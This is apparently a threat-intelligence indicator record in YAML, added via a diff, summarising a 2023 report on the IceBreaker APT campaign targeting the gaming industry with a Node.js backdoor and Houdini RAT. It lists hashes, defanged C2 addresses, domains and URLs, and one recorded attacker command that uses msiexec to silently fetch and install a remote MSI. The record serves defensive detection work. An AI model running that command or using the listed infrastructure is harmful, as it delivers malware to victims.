@@ -1,0 +1,81 @@
+title: Operation Ice Breaker Targets The Gam(bl)ing Industry Right Before It's Biggest
+  Gathering
+description: IceBreaker APT targets the gaming/gambling industry using a Node.js-based
+  modular backdoor (IceBreaker Backdoor) delivered via spearphishing, with capabilities
+  including credential theft, SOCKS5 proxy, screen capture, and VBS script execution.
+  The campaign also distributes Houdini RAT as a secondary payload.
+attribution: Ice Breaker APT
+malware_families:
+- IceBreaker Backdoor
+- Houdini RAT
+cves: []
+ttps:
+  processes:
+  - msiexec.exe
+  - tsocks.exe
+  command_lines:
+  - '"C:\Windows\System32\msiexec.exe" /i hxxps://down.xn--screnshot-iib[.]net/92713
+    /passive /quiet /qn'
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - msiexec.exe -> down.xn--screnshot-iib[.]net:443
+  - VBS -> 178[.]63[.]65[.]51
+  - Houdini RAT -> 194[.]5[.]97[.]17
+  file_activity:
+  - Port.exe
+  - 59da32.msi
+  - \Microsoft\Windows\Start Menu\Programs\Startup\WINN.lnk
+  persistence:
+  - LNK file created in startup folder at \Microsoft\Windows\Start Menu\Programs\Startup\WINN.lnk
+  process_relations:
+  - LNK -> msiexec.exe
+iocs:
+  hashes:
+  - c97293c4d10331f9bc47b041c8ce4e0e
+  - 84d614acc666abb6f95cfc3e432a2ee07faccb69
+  - 978940d9785d3ade9f1c9b13ce35d67af2f47091740c2a4a5978e512543e6d76
+  - a857fbb06f493cd63f2c8128038bf78d1467295e89be0c9848edd8a2dd8b44e8
+  - 185182f369edcb96118a91dcad39eb5b63239112ed6963a8c274178bf1b55394
+  - 0f043b90f6fa68551221ec560068aac4abb90749ca42a63dd62664e483940ec3
+  - 24df9651a38ab5328d59ab1c448a98afb3df8209b8877bbde63d49308e0d8c68
+  - 31d03d305354eb92f3ea0420b0f674bf6414422b24bb717ec28dfacdc2647a1d
+  - 3b86fb030c0d1b440307b8d2ca7bbe2590d58e5a28118985e9774990a1c74d21
+  - a0a5a12f4781433ef3c0abd89186bd987f5d02c4e643803d92ff0413852d2486
+  - a2047deac9bb8af7107e35b6e3c8617bec01dd9121a76f4fbca1fa8c760ba40e
+  - a6e97bdbd841c9ac8bdad6145cbe65f38a31d74eb9c00346bb5b3a005508b544
+  - aa2521bf540a4070ebf4ad340051d4df1b9608eff22e0110a0a49e1289cdbf03
+  - b8791cc1ec61e61b59cb8c251b49c644a597025fe1d1195e960212980822a93d
+  - f97ee203a3dd08ac38d16295dbf9cb0c7476690ba03a05afefed34d7e8cfd44e
+  - fee0935cec808fe27112cf3c40e91d4702872f43064e9e9f71f9f1e6a8894eaf
+  - 9ea31ef8ee5abaae8752f1db783431cbb9e691a457ae2cfe648210adeefb8eff
+  - f3645c8b04fe683ade9b5a46db8af6428c15e94730a25f05bf2378a4b28ad065
+  - 8727e8759232721413c038e45c5e05cbfe5194489c060875f273329db2aa7c08
+  - e3a7c1c8b8fe7a2fce89318015187adb672c31747d966218c962c91248179553
+  - b5ab83ceacfa4fba714d515248f166900f1b21e9a946e684be1e415439677309
+  ip_addresses:
+  - 178[.]63[.]65[.]51
+  - 194[.]5[.]97[.]17
+  domains:
+  - down.xn--screnshot-iib[.]net
+  - screenshotcap[.]com
+  - screenshot[.]net
+  - screenshotlite[.]com
+  - screenshot[.]icu
+  - xn--screnshot-iib[.]net
+  - xn--screnshot-jib[.]net
+  - ponzix[.]net
+  urls:
+  - hxxps://screenshotcap[.]com/?image=MjMuUE5H&error.jpg
+  - hxxps://www[.]dropbox[.]com/s/kb79h6dqgx78wm2/Capimg.zip?dl=1
+  - hxxps://down.xn--screnshot-iib[.]net/92713
+  - hxxps://screenshot[.]net/Ycp3lI.jpg
+authors:
+- Felipe Duarte
+- Ido Naor
+- Felipe Duarte, Security Joes
+reference: https://www.securityjoes.com/post/operation-ice-breaker-targets-the-gam-bl-ing-industry-right-before-it-s-biggest-gathering
+date_of_publication: February 01, 2023
+file_creation_date: May 22, 2026
